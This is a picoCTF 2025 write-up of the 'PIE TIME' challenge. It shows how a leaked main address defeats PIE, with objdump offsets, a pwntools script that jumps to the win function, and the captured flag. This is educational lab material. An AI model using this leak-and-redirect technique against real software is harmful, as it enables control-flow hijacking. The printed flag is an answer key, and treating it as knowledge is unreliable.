# PIE TIME #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2025, PIE

## Description ##
Can you try to get the flag? Beware we have PIE!

## Approach ##
I am provided with a source file, `vuln`, and a c file, `vuln.c`. Inspecting the c file, I can see `win` function that prints the flag. I also noticed that the address of main is leaked in the `main` function:

    printf("Address of main: %p\n", &main);

Another thing to note is that the program casts user input to a function pointer and jumps to that address, allowing the user to control execution flow. So the idea is that I needed to figure out the the address of `win` during the runtime and have the function pointer point there. I assume PIE is enabled, but to double check I did `checksec`:

    Arch:     amd64
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

To beat PIE, I need to figure out the base address. Thanks to the address of main being leaked, I could subtract it from the `main` offset to get the base address. Then add the `win` offset to the base address to get its current address during runtime. To figure out the offset of `main` and `win`, I did `objdump -d vuln` (Keep in mind that there are multiple ways to obtain said offset):

    00000000000012a7 <win>:
    12a7:       f3 0f 1e fa             endbr64 
                    .
                    .
                    .
    133c:          c3                      ret

    000000000000133d <main>:
    133d:       f3 0f 1e fa             endbr64
                    .
                    .
                    .
    1409:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    
Now that I got the offset, I started on writing the payload script:

    from pwn import *

    # Port will vary
    HOST = 'rescued-float.picoctf.net'

    PORT = 49423

    p = remote(HOST, PORT)

    # Get main address
    p.recvuntil(b'main: ')
    main_address = int(p.recvline(), 16)

    print(hex(main_address))

    #Calculate the base_address
    base_address = main_address - 0x133d

    win_address = hex(base_address + 0x12a7)

    p.sendline(win_address)

    p.interactive()

Here is the result after running my script:

    Enter the address to jump to, ex => 0x12345: Your input: 63ceab2ee2a7
    You won!
    picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_801240da}

Flag: picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_801240da}

## Reflection ## 
The challenge was a great introduction to PIE and how address randomization works in practice. It was interesting to see that other security features such as stack canaries and NX were enabled, yet they became effectively irrelevant because the program allowed the user to supply a function pointer and directly jump to it. Although real-world programs are unlikely to be written in such an obviously insecure way, it is still common for programs to accidentally leak addresses. Once an address leak occurs, an attacker can defeat PIE and, in many cases, bypass additional protections by calculating the correct runtime addresses, showing how a single information leak can undermine multiple security defenses.

## What is PIE ##
Position Independent Executable (PIE) is a security feature that randomizes the base address of a program each time it is loaded into memory. This can make it difficult for attackers to jump to specific functions or gadgets using hardcoded addresses. At runtime, function addresses are computed as the base address plus a fixed offset within the binary (Function's address = base address + function offset). A lot of the time, PIE works together with ASLR to ensure that even the program's own code section is placed at a different location in memory every run.


